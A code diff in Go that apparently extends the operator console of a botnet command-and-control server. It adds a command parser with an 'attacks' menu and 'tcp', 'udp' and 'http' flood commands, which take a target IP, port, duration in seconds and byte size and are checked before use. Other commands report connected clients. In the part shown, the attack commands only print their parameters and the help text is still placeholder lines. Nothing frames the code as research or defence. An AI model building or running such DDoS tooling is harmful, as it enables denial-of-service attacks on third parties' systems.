@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"strconv"
 	"strings"
 	"time"
 
@@ -29,6 +30,24 @@ func hashMessage(message string) string {
 	hashString := hex.EncodeToString(hashBytes)
 
 	return hashString
+}
+
+func validateAttackParameters(parameters []string) error {
+	if len(parameters) != 5 {
+		return fmt.Errorf("Custom error: %s", "not enough parameters")
+	}
+
+	_, err := strconv.Atoi(parameters[3])
+	if err != nil {
+		return fmt.Errorf("failed to convert secs to integer: %v", err)
+	}
+
+	_, err = strconv.Atoi(parameters[4])
+	if err != nil {
+		return fmt.Errorf("failed to convert bytes to integer: %v", err)
+	}
+
+	return nil
 }
 
 func sendMessage() {
@@ -71,15 +90,47 @@ func main() {
 			reader := bufio.NewReader(os.Stdin)
 			command, _ := reader.ReadString('\n')
 			command = strings.TrimRight(command, "\n")
+			parameters := strings.Split(command, " ")
 
+			switch parameters[0] {
 			// Check if the user wants to exit
-			if command == "exit" {
-				fmt.Println("Exiting the Admin Panel.")
+			case "exit":
+				fmt.Println("Exiting server.")
 				close(broadcast)
 				os.Exit(0)
-			}
 
-			broadcast <- command
+			case "attacks":
+				fmt.Println("	tcp ip port secs bytes")
+
+			case "?", "help":
+				fmt.Println("	attacks: shows all the possible attacks")
+				fmt.Println("	command 2")
+				fmt.Println("	command 3")
+				fmt.Println("	command 4")
+
+			case "show":
+				fmt.Printf("Number of connected clients: %v\n", 0)
+				_, err := conn.Write([]byte("show")) //Sends message to clients
+				if err != nil {
+					fmt.Println("Error broadcasting data:", err)
+					continue
+				}
+
+			case "tcp", "udp", "http":
+				err = validateAttackParameters(parameters)
+				if err != nil {
+					fmt.Println("attack not validated", err)
+					continue
+				}
+				fmt.Println(parameters)
+			case "":
+				continue
+
+			default:
+				//broadcast <- command //Takes the command and sends in to the channel
+				fmt.Println("Unknown command")
+				//so that its broadcasted to the clients
+			}
 		}
 
 	}()
